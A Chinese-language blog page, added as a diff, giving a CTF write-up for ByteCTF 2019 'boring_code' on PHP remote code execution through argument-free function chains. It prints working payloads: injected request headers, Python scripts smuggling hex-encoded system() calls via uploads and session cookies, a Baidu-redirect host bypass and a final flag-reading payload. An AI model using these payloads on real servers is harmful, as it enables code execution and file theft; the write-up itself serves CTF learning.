@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言本题涉及的无参函数RCE的思路值得整理一下 无参函数RCE如果代码有类似如下的限制123if(&amp;apos;;&amp;apos; === preg_replace(&amp;apos;/[^\W]+\((?R)?\)/&amp;apos;, &amp;apos;&amp;apos;, $_GET[&amp;apos;code&amp;apos;])) &amp;#123;        eval($_GET[&amp;apos;code&amp;apos;]);&amp;#125">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参函数RCE-bytectf2019-boring_code">
+<meta property="og:url" content="http://yoursite.com/2019/09/14/bytectf-无参RCE/index.html">
+<meta property="og:site_name" content="R1dd1er&#39;s blogs">
+<meta property="og:description" content="前言本题涉及的无参函数RCE的思路值得整理一下 无参函数RCE如果代码有类似如下的限制123if(&amp;apos;;&amp;apos; === preg_replace(&amp;apos;/[^\W]+\((?R)?\)/&amp;apos;, &amp;apos;&amp;apos;, $_GET[&amp;apos;code&amp;apos;])) &amp;#123;        eval($_GET[&amp;apos;code&amp;apos;]);&amp;#125">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-14T14:36:03.121Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="无参函数RCE-bytectf2019-boring_code">
+<meta name="twitter:description" content="前言本题涉及的无参函数RCE的思路值得整理一下 无参函数RCE如果代码有类似如下的限制123if(&amp;apos;;&amp;apos; === preg_replace(&amp;apos;/[^\W]+\((?R)?\)/&amp;apos;, &amp;apos;&amp;apos;, $_GET[&amp;apos;code&amp;apos;])) &amp;#123;        eval($_GET[&amp;apos;code&amp;apos;]);&amp;#125">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'R1dd1er'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/14/bytectf-无参RCE/">
+
+
+
+
+
+  <title>无参函数RCE-bytectf2019-boring_code | R1dd1er's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R1dd1er's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">积跬步，至千里</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/bytectf-无参RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R1dd1er">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R1dd1er's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">无参函数RCE-bytectf2019-boring_code</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-14T22:35:03+08:00">
+                2019-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本题涉及的无参函数RCE的思路值得整理一下</p>
+<h2 id="无参函数RCE"><a href="#无参函数RCE" class="headerlink" title="无参函数RCE"></a>无参函数RCE</h2><p>如果代码有类似如下的限制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该正则会ban掉带有参数的函数,只允许执行不含参数的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();   //通过</span><br><span class="line">a(b());  //通过</span><br><span class="line">a(&apos;test&apos;);   //不通过</span><br></pre></td></tr></table></figure></p>
+<h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getenv - 获取环境变量的值</span><br><span class="line">getenv （ string $varname [， bool $local_only=FALSE ]）： string</span><br></pre></td></tr></table></figure>
+<p>eg:<code>var_dump(getenv());</code>获取所有环境变量</p>
+<p>eg:<code>var_dump(getenv(&#39;PATH&#39;));</code>获取某个环境变量的值</p>
+<p>可以使用以下的办法随机取出这个大数组中的一些值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for($i=0;$i&lt;5;$i++)&#123;</span><br><span class="line">	var_dump(array_rand(array_flip(getenv())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>array_rand</code>从数组中随机取出一个或多个单元</p>
+<p><code>array_flip</code>将数组中的键名变成值,值变成键名</p>
+<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>该函数的作用是获取全部 HTTP 请求头信息</p>
+<p><code>http://127.0.0.1/bytesctf/web1_test.php?code=var_dump(getallheaders());</code><br>同时我们在请求头里加入恶意参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /bytesctf/web1_test.php?code=var_dump(reset(getallheaders())); HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/bytesctf/web1_test.php?code=var_dump(getallheaders());</span><br><span class="line">Cookie:PHPSESSID=9knkec8tve0uj70b2git95a0d3</span><br><span class="line">hack:phpinfo();</span><br></pre></td></tr></table></figure>
+<p>PS:不知道为什么本地测试的时候返回的数组是倒序的,也就是放在最后一个的<code>hack:phpinfo();</code>在数组中却是第一个,暂时还没搞懂为什么</p>
+<p><code>GET /bytesctf/web1_test.php?code=eval(reset(getallheaders()));</code>这样便可执行相应的代码,然后进一步利用</p>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>前面讲的getallheaders()函数是apache的函数,所以必须是中间件是apache才能利用,<code>get_defined_vars()</code>利用的范围则更为广泛<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars — 返回由所有已定义变量所组成的数组 </span><br><span class="line">get_defined_vars ( void ) : array</span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure></p>
+<p><code>GET /bytesctf/web1_test.php?code=var_dump(get_defined_vars());</code><br>发现确实可以返回<code>$_GET</code>,<code>$_POST</code>,<code>$_COOKIE</code>,<code>$_FILES</code>,<code>$_SESSION</code>,<code>$_REQUEST</code>,<code>$_SERVER</code>等全局变量,可以在GET中添加参数进行RCE</p>
+<p><code>GET /bytesctf/web1_test.php?code=var_dump(end(current(get_defined_vars())));&amp;hack=phpinfo(); HTTP/1.1</code>取到了相应的值</p>
+<p><code>GET /bytesctf/web1_test.php?code=eval(end(current(get_defined_vars())));&amp;hack=phpinfo(); HTTP/1.1</code>成功执行phpinfo</p>
+<p>再附一个使用$_FILE的参考脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">payload = &quot;system(&apos;ls /tmp&apos;);&quot;.encode(&apos;hex&apos;)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(&apos;sky cool!&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(&apos;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&apos;, files=files, allow_redirects=False)</span><br><span class="line"></span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure></p>
+<p>使用session_id()也能达到类似的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;</span><br><span class="line">payload = &quot;echo &apos;sky cool&apos;;&quot;.encode(&apos;hex&apos;)</span><br><span class="line">cookies = &#123;</span><br><span class="line">	&apos;PHPSESSID&apos;:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure></p>
+<h3 id="dirname-amp-chdir"><a href="#dirname-amp-chdir" class="headerlink" title="dirname() &amp; chdir()"></a>dirname() &amp; chdir()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirname — 返回路径中的目录部分</span><br><span class="line">dirname ( string $path ) : string</span><br><span class="line">给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。</span><br></pre></td></tr></table></figure>
+<p>也就是我们可以通过dirname获取上层目录,并且是可迭代的,使用一层就上跳一层</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir — 改变目录</span><br><span class="line">chdir ( string $directory ) : bool</span><br><span class="line">将 PHP 的当前目录改为 directory。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">getcwd ( void ) : string</span><br></pre></td></tr></table></figure>
+<p>通过以上函数的配合就可以达到目录跳转的功能<code>chdir(dirname(getcwd()))</code></p>
+<p>构造出任意读取<code>GET /bytesctf/web1_test.php?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));;</code></p>
+<h2 id="bytectf-Boring-Code"><a href="#bytectf-Boring-Code" class="headerlink" title="bytectf-Boring_Code"></a>bytectf-Boring_Code</h2><p>查看源代码有hint,直接查看code文件</p>
+<p>题面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_valid_url($url) &#123;</span><br><span class="line">    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        if (preg_match(&apos;/data:\/\//i&apos;, $url)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;url&apos;]))&#123;</span><br><span class="line">    $url = $_POST[&apos;url&apos;];</span><br><span class="line">    if (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        if (preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123;</span><br><span class="line">                    echo &apos;bye~&apos;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第一层限制死了得是xxx.baidu.com,有两种办法,第一种直接买域名,第二种则是利用baidu的link跳转,跳到自己的网站,然后网站上写相应的payload,绕过了域名的限制</p>
+<p>类似这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/link?url=w1-LGqOMWeSjD0ciAK9yBavAZRAeHbXiKNPeEkicXrulug0uo6_PD-kiguT6pVJN&amp;wd=&amp;eqid=ada158ea00375a58000000065d7baf02</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是利用无参函数来读取文件,思路是利用<code>chr(time())</code>来产生<code>.</code>,达到<code>scandir(&#39;.&#39;)</code>的效果,其中chr()一个值是模256的</p>
+<p>根据hint,flag的文件在上层目录,还需要构造一个上跳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(&apos;.&apos;));</span><br><span class="line">php shell code:1:</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(8) &quot;web1.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这样通过scandir就可以提取出一个<code>..</code>,然后通过<code>chdir(&#39;..&#39;)</code>来完成上跳,但是这个函数返回的是布尔型,而<code>time()</code>可以接受个布尔型,并且没有什么影响(在PHP5.6是这样的,我在本地7.3版本测试时发现time接受布尔值后一直返回NULL)</p>
+<p>这样就可以构造最终的payload<br><code>readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));</code></p>
+<p>部署在跳转域名的服务器下,一秒打一次,256秒内一定能打到</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<p><a href="https://xz.aliyun.com/t/6305#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6305#toc-3</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/11/CBC相关攻击/" rel="next" title="CBC相关攻击">
+                <i class="fa fa-chevron-left"></i> CBC相关攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="R1dd1er">
+            
+              <p class="site-author-name" itemprop="name">R1dd1er</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无参函数RCE"><span class="nav-number">2.</span> <span class="nav-text">无参函数RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getenv"><span class="nav-number">2.1.</span> <span class="nav-text">getenv()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getallheaders"><span class="nav-number">2.2.</span> <span class="nav-text">getallheaders()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-vars"><span class="nav-number">2.3.</span> <span class="nav-text">get_defined_vars()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dirname-amp-chdir"><span class="nav-number">2.4.</span> <span class="nav-text">dirname() &amp; chdir()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bytectf-Boring-Code"><span class="nav-number">3.</span> <span class="nav-text">bytectf-Boring_Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R1dd1er</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
